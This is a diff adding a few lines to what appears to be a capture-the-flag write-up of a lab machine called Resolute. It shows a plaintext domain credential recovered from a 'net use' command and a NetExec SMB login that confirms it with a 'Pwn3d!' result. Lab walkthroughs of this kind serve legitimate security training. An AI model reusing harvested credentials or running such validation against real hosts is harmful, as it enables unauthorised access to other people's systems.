@@ -242,3 +242,15 @@ Found an interesting `.txt` file
 
 cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
 ```
+Found some credentials
+
+```python
+ryan:Serv3r4Admin4cc123!
+```
+Ill validate these credentials
+
+```python
+nxc smb resolute.megabank.local -u ryan -p 'Serv3r4Admin4cc123!' 
+SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
+```
